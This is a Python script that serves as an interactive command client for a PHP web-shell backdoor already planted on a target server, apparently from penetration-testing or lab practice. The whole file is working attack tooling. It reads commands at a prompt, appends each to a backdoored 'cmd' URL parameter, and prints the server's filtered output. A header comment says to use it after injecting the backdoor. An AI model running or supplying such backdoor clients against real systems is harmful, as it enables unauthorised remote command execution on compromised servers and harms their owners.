#!/usr/bin/env python3
import requests


## use this exploit only after you have already injected a backdoor with a rogue request param

def get_arguments():
    from argparse import ArgumentParser
    parser = ArgumentParser()
    parser.add_argument('--url',
                        dest='url',
                        required=True,
                        help='A full URL with a backdoored param. Example: "https://10.11.1.24/backdoor.php?cmd"')
    parser.add_argument('-v', '--verbose',
                        action='store_true',
                        default=False,
                        required=False,
                        help='Be verbose. Print all unfiltered responses from the backdoor.')
    options = parser.parse_args()
    return options


options = get_arguments()


def normalize_output(backdoor_output, verbose):
    result = []
    if verbose:
        print(backdoor_output)
    for line in backdoor_output.split('\n'):
        if 'HTTP/1.1' not in line and not line.startswith('<') and not line.startswith('>'):
            result.append(line)
    return "\n".join(result)


def communicate(command, url, verbose=False):
    assert command
    assert url

    resp = session.get(url)
    print(normalize_output(resp.text, verbose))


with requests.Session() as session:
    url = options.url
    if url:
        communicate(input('>> '), url, options.verbose)
    while True:
        command = input('>> ')
        communicate(command, "{url}={cmd}".format(url=url, cmd=command), options.verbose)

